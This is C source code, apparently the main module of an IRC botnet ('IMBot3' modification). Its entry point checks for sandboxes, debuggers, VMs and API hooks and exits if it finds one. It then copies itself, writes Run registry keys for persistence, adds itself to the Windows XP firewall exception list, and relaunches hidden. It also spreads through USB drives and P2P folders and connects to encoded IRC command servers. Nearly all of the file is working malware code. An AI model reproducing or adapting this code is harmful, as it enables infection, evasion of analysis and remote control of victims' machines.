/*
 ___    _____  __________          __  ________  
|   |  /     \ \______   \  ____ _/  |_\_____  \ 
|   | /  \ /  \ |    |  _/ /  _ \\   __\ _(__  < 
|   |/    Y    \|    |   \(  <_> )|  |  /       \
|___|\____|__  /|______  / \____/ |__| /______  /
             \/        \/  Just fo h1t3m mod  \/ 
*/
#include "../h/includes.h"
#include "../h/functions.h"
#include "../configs.h"

#pragma comment(linker, "/subsystem:windows ")

DWORD dwstarted;
DWORD dwconnected;

IRC mainirc;
HANDLE xetum;
int curserver;
int srvsz=(sizeof(sinfo)/sizeof(SERVER));
int authsize=(sizeof(authost)/sizeof(LPTSTR));
int versionsize=0;

char exip[MAX_IP];
char inip[MAX_IP];
char host[MAX_HOSTNAME];

extern char str_main_thread[];

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
char msg[256], CurrentName[MAX_PATH];

    LoadDLLs();

#ifndef NO_ANTI
	if (AntiSandBox())
	return 0;
	if (IsInSandbox())
	return 0;
	HANDLE hProcess;
	hProcess = GetCurrentProcess();
	if (IsDebuggerRunning(hProcess) == TRUE)
	{
		ExitProcess(0);
	}
	CloseHandle(hProcess);
	if (IsProcessRunningUnderVM()==TRUE)
	{
		ExitProcess(0);
	}
#endif

	unsigned char szBytes[] = { 0xc8, 0x0, 0x4, 0x0, 0x60 }; 
    DWORD dwAddr = (DWORD)GetProcAddress(LoadLibrary("user32.dll"), "MessageBoxA"); 
    if(!memcmp((LPVOID)dwAddr, (LPVOID)szBytes, sizeof(szBytes))) 
    { 
        ExitProcess(0); 
    }
	char cpbot[MAX_PATH];
	char movetopath[MAX_PATH];
	char spath[MAX_PATH];

	GetModuleFileName(GetModuleHandle(NULL), cpbot, sizeof(cpbot));
	ExpandEnvironmentStrings(Decode(gotopth),movetopath,sizeof(movetopath));
	sprintf(spath,"%s\\%s",movetopath,Decode(exename));
	
	if (MoveBot(movetopath,Decode(exename)))
	{

    HKEY hndKey = NULL;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL, &hndKey, NULL);
	RegSetValueEx(hndKey,Decode(szRegname),0, REG_SZ,(const unsigned char *)Decode(exename),strlen(Decode(exename)));
	RegCloseKey(hndKey);
	//Registery Startup NT/2000/XP/Vista
	RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\",0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL, &hndKey, NULL);
	RegSetValueEx(hndKey,Decode(szRegname),0, REG_SZ,(const unsigned char *)Decode(exename),strlen(Decode(exename)));
	RegCloseKey(hndKey);
	//Firewall bypass WinXP SP1/2/3
	GetModuleFileName(0, CurrentName, sizeof(CurrentName));
	char pfad[256];
	_snprintf(pfad, sizeof(pfad),"%s:*:Enabled:%s", CurrentName, Decode(szRegname));
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hndKey, 0);
	RegSetValueEx(hndKey, CurrentName, 0, REG_SZ, (const unsigned char *)pfad, strlen(pfad));
	RegCloseKey(hndKey);

		//MessageBox(NULL, "Picture can not be displayed.","Windows Microsoft Viewer", NULL);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		ZeroMemory(&pinfo,sizeof(pinfo));
		ZeroMemory(&sinfo,sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;
		if (CreateProcess(spath,NULL,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS|DETACHED_PROCESS,NULL,movetopath,&sinfo,&pinfo))
		{
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}

		ExitProcess(1);
	}
	DWORD id;
#ifndef NO_USB
NTHREAD usb;
usb.conn = &mainirc;
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)USB_Spreader, &usb, 0, &id); // Execute USB spread on install.
#endif
#ifndef NO_P2P
InfectP2P();
#endif
	HANDLE threadhandle;
	if((threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Bthd, NULL, 0, &id)) == 0) 
		return 0;
	WaitForSingleObject(threadhandle, INFINITE);
	CloseHandle(threadhandle);
	return 0;
}
DWORD WINAPI Bthd(LPVOID param)
{
	for (int m=0;m<6;m++)
	{
		if(!(xetum=CreateMutex(NULL, FALSE, xetumhandle)))
				Sleep(5000);
		else
			break;
	}
	if (WaitForSingleObject(CreateMutex(NULL, TRUE, xetumhandle), 30000) == WAIT_TIMEOUT)
		ExitProcess(0);
	addthread(MAIN_THREAD,str_main_thread,main_title);
	srand(GetTickCount());
	dwstarted=GetTickCount();
	WSADATA wsadata;
	if (fWSAStartup(MAKEWORD(2,2),&wsadata)!=0)
		ExitProcess(-2);
	int i=0;
	DWORD id=0;
	char *ip;
	char hostname[256];
	struct hostent *h;
	fgethostname(hostname, 256);
	h = fgethostbyname(hostname);
	ip = finet_ntoa(*(struct in_addr *)h->h_addr_list[0]);
	strncpy(inip,ip,sizeof(inip));
	curserver=0;
	HookProtocol(&mainirc);
	while (mainirc.should_connect()) {
		if (!mainirc.is_connected())
		{
			mainirc.start(Decode(sinfo[curserver].host),sinfo[curserver].port,
					  mainirc.nickgen(NICK_TYPE,REQ_NICKLEN),mainirc.nickgen(IDENT_TYPE,REQ_IDENTLEN),
					  mainirc.nickgen(REALN_TYPE,REQ_REALNLEN),Decode(sinfo[curserver].pass));
			mainirc.message_loop();
		}
		else
			mainirc.message_loop();
		Sleep(SFLOOD_DELAY);
		if (curserver==(srvsz-1))
			curserver=0;
		else
			curserver++;
	}
	fWSACleanup();
	ReleaseMutex(xetum);
	ExitThread(0);
		return TRUE;
}